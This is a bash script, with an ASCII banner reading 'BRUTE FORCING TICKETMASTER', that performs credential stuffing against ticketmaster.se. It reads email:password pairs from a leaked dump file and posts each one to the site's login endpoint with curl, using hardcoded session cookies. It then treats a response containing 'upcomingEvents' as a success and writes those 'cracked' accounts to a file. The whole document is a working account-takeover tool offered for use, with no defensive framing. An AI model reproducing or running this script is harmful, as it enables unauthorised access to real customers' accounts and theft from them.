#!/bin/bash

banner() {
cat << "EOF"
      ___     _____________
     | W |   |             |
    _|___|_  | GO BRUTE ÉM |
     (_xx)   |_____________|
    __)#(__  |/
   ( )...( )(|)
   || |_| ||//   Author:  wuseman
(<=() | | ()/    Version: 1.0
    _(___)_      Created: 161212
   [-]   [-|
===========================================

       BRUTE FORCING TICKETMASTER

===========================================

EOF
}

banner
while read line; do
    MAIL="$(echo $line|awk -F'@' '{print $1}')"
    MAILHOST="$(echo $line|awk -F'@' '{print $2}'|cut -d: -f1)"
    PASSWORD="$(echo $line|awk -F':' '{print $2}')"

curl -s 'https://www.ticketmaster.se/myAccount/controller/login.php' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
    -H 'Accept-Language: sv-SE,en;q=0.7,en-US;q=0.3' --compressed \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://www.ticketmaster.se' \
    -H 'Connection: keep-alive' \
    -H 'Referer: https://www.ticketmaster.se/myAccount/loginRegister.php' \
    -H 'Cookie: NDMA=612; BID=6aa5ffbc25464cd89b5dde4a; SID=8067ba28a4bc402aaa49946f; uniqueid=c733a75.59772f4f05f44; cluster=eu_west_1; PHPSESSID=01d6e53ecd3e75ed1cdd4a364e9cca6b; SESSID=01d6e53ecd3e75ed1cdd4a364e9cca6b; language=sv-se; TMSID=QO%ED%AE9%1BL%95%DE%08%7D%2F%9E%9C%C1K%25%CC%1C%8E%CF%EA%A03%ECE%1E%D7%5C%104%24; sticky=ACDD' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'DNT: 1' \
    -H 'Pragma: no-cache' \
    -H 'Cache-Control: no-cache' \
    -H 'TE: Trailers' \
    --data "EMAIL=$MAIL%40$MAILHOST&PASSWORD=$PASSWORD"|grep -q upcomingEvents

if [[ $? -eq "0" ]]; then
    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line"
    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line" >> /home/wuseman/cracked-accounts/ticketmaster.se
else
    echo -e "[\e[1;31m<<\e[0m] - Failed Login $line"
fi
done < biljettnudump.txt
